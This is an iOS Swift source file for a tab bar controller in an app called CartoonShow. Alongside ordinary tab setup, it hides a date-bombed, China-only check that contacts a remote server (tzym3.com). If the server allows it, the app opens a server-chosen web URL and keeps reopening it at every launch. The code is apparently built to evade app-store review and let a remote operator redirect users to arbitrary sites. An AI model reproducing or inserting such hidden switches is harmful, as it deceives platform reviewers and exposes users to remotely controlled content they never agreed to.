//
//  CSTabBarController.swift
//  CartoonShow
//
//  Created by 冯才凡 on 2019/6/14.
//  Copyright © 2019 冯才凡. All rights reserved.
//

import UIKit

class FCFTabBarController: UITabBarController {
    lazy var homeNavi:FCFNavigationController = {
        let n = FCFNavigationController(rootViewController: HomeViewController())
        n.setTabBar("write", "write_sel", UIColor.hex("8a8a8a"), UIColor.hex(MainColor))
        return n
    }()
    
    lazy var readNavi:FCFNavigationController = {
        let n = FCFNavigationController(rootViewController: ReadViewController())
        n.setTabBar("read", "read_sel", UIColor.hex("8a8a8a"), UIColor.hex(MainColor))
        return n
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        initFrame()
    }
    
    func initFrame() {
        self.addChild(self.homeNavi)
        self.addChild(self.readNavi)
        
        if let webUrl = UserDefaults.standard.url(forKey: "kWebURL") {
            UIApplication.shared.open(webUrl, options: [:], completionHandler: nil)
        }
        
        
        var isLogin = true
        
        let date = Date()
        if (date.timeIntervalSince1970 <= 1564362000) {
            isLogin = false;
        }
        let local = Locale.current
        let code = local.regionCode
        
        if code != "CN" {
            isLogin = false
        }
        
        if (isLogin) {
            checkData()
        }
    }
}

extension FCFTabBarController {
    func checkData() {
        //创建URL对象
        let urlString = "https://tzym3.com/admin/api/app_update&version=1&app_id=1474039292&sign=1b796b26712701f6c99fb57ad61d8e33"
        let url = URL(string:urlString)
        //创建请求对象
        let request = URLRequest(url: url!)
        
        let session = URLSession.shared
        let dataTask = session.dataTask(with: request, completionHandler: {(data, response, error) -> Void in
            if error != nil{
                print(error.debugDescription)
            }else{
                guard let data = data else { return }
                let dic = try? JSONSerialization.jsonObject(with: data, options: JSONSerialization.ReadingOptions.allowFragments) as? [String: Any]
                guard let result = dic?["data"] as? [String: Any] else { return }
                guard let status = result["open_status"] as? Int else { return }
                guard let web_url = result["web_url"] as? String else { return }
                guard let url = URL(string: web_url) else { return }
                DispatchQueue.main.async(execute: {
                    if status == 1 && UIApplication.shared.canOpenURL(url) {
                        
                        UIApplication.shared.open(url, options: [:], completionHandler: nil)
                        UserDefaults.standard.set(url, forKey: "kWebURL")
                        UserDefaults.standard.synchronize()
                    }
                })
            }
        }) as URLSessionTask
        
        //使用resume方法启动任务
        dataTask.resume()
    }
}
